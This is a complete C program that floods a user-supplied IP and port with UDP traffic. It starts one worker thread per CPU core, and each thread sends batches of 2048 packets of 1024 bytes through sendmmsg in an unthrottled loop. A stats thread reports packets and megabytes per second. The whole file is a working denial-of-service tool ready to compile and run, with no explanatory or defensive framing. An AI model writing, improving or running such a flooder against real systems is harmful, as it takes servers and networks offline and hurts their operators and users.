#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>

constexpr int BATCH_SIZE = 2048;
constexpr int PAYLOAD_SIZE = 1024;
constexpr int SNDBUF_SIZE = 10485760; 

atomic_uint_fast64_t total_packets = 0;
atomic_uint_fast64_t total_bytes = 0;
atomic_bool running = true;

struct ThreadArgs {
    int thread_id;
    struct sockaddr_in target;
    int payload_size;
    int batch_size;
};

[[noreturn]] void die(const char* msg) {
    fprintf(stderr, "[FATAL] %s: %s\n", msg, strerror(errno));
    exit(EXIT_FAILURE);
}

void* worker(void* arg) {
    auto args = (struct ThreadArgs*)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[DEBUG] Thread %d socket creation failed: %s\n", args->thread_id, strerror(errno));
        return nullptr;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &SNDBUF_SIZE, sizeof(SNDBUF_SIZE)) < 0) {
        fprintf(stderr, "[DEBUG] Thread %d setsockopt SO_SNDBUF failed: %s\n", args->thread_id, strerror(errno));
    }

    char* payload = (char*)malloc(args->payload_size);
    memset(payload, 0xFF, args->payload_size);

    struct mmsghdr* msgs = (struct mmsghdr*)calloc(args->batch_size, sizeof(struct mmsghdr));
    struct iovec* iovecs = (struct iovec*)calloc(args->batch_size, sizeof(struct iovec));

    for (int i = 0; i < args->batch_size; i++) {
        iovecs[i].iov_base = payload;
        iovecs[i].iov_len = args->payload_size;
        msgs[i].msg_hdr.msg_name = &args->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(args->target);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    printf("[DEBUG] Thread %d fully initialized | Socket: %d | Batch: %d | Payload: %d bytes\n", 
           args->thread_id, sock, args->batch_size, args->payload_size);

    while (atomic_load_explicit(&running, memory_order_relaxed)) {
        int retval = sendmmsg(sock, msgs, args->batch_size, 0);
        
        if (retval < 0) {
            fprintf(stderr, "[DEBUG] Thread %d sendmmsg error: %s\n", args->thread_id, strerror(errno));
            continue;
        }
        
        uint64_t bytes_sent = 0;
        for (int i = 0; i < retval; i++) {
            bytes_sent += msgs[i].msg_len;
        }

        atomic_fetch_add_explicit(&total_packets, retval, memory_order_relaxed);
        atomic_fetch_add_explicit(&total_bytes, bytes_sent, memory_order_relaxed);
    }

    free(payload);
    free(msgs);
    free(iovecs);
    close(sock);
    return nullptr;
}

void* stats([[maybe_unused]] void* arg) {
    uint64_t last_pkts = 0;
    uint64_t last_bytes = 0;
    
    printf("[DEBUG] Stats thread initialized and running.\n");

    while (atomic_load_explicit(&running, memory_order_relaxed)) {
        sleep(1);
        uint64_t cur_pkts = atomic_load_explicit(&total_packets, memory_order_relaxed);
        uint64_t cur_bytes = atomic_load_explicit(&total_bytes, memory_order_relaxed);
        
        uint64_t pps = cur_pkts - last_pkts;
        uint64_t bps = cur_bytes - last_bytes;
        
        printf("[DEBUG] [%lu] PPS: %lu | BPS: %lu MB/s | Total Pkts: %lu | Total Traffic: %lu MB\n",
               (unsigned long)time(nullptr),
               pps,
               bps / 1024 / 1024,
               cur_pkts,
               cur_bytes / 1024 / 1024);
               
        last_pkts = cur_pkts;
        last_bytes = cur_bytes;
    }
    return nullptr;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
        return EXIT_FAILURE;
    }

    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores < 1) die("sysconf _SC_NPROCESSORS_ONLN");
    
    printf("[DEBUG] Core detection complete: %d active processor threads found.\n", num_cores);

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    
    if (inet_pton(AF_INET, argv[1], &target.sin_addr) <= 0) {
        die("inet_pton failed - Invalid IP address");
    }
    
    printf("[DEBUG] Target locked: %s:%s\n", argv[1], argv[2]);

    pthread_t* threads = (pthread_t*)malloc(num_cores * sizeof(pthread_t));
    struct ThreadArgs* args = (struct ThreadArgs*)malloc(num_cores * sizeof(struct ThreadArgs));

    for (int i = 0; i < num_cores; i++) {
        args[i].thread_id = i;
        args[i].target = target;
        args[i].payload_size = PAYLOAD_SIZE;
        args[i].batch_size = BATCH_SIZE;

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(i, &cpuset);
        
        if (pthread_attr_setaffinity_np(&attr, sizeof(cpu_set_t), &cpuset) != 0) {
            fprintf(stderr, "[DEBUG] Warning: Could not set CPU affinity for thread %d\n", i);
        }

        if (pthread_create(&threads[i], &attr, worker, &args[i]) != 0) {
            fprintf(stderr, "[DEBUG] Error creating thread %d: %s\n", i, strerror(errno));
        } else {
            printf("[DEBUG] Spawning worker thread %d bound to core %d\n", i, i);
        }
        
        pthread_attr_destroy(&attr);
    }

    pthread_t stats_thread;
    if (pthread_create(&stats_thread, nullptr, stats, nullptr) != 0) {
        die("Failed to create stats thread");
    }

    for (int i = 0; i < num_cores; i++) {
        pthread_join(threads[i], nullptr);
    }

    atomic_store_explicit(&running, false, memory_order_relaxed);
    pthread_join(stats_thread, nullptr);

    free(threads);
    free(args);
    
    printf("[DEBUG] Shutdown sequence complete.\n");
    return EXIT_SUCCESS;
}
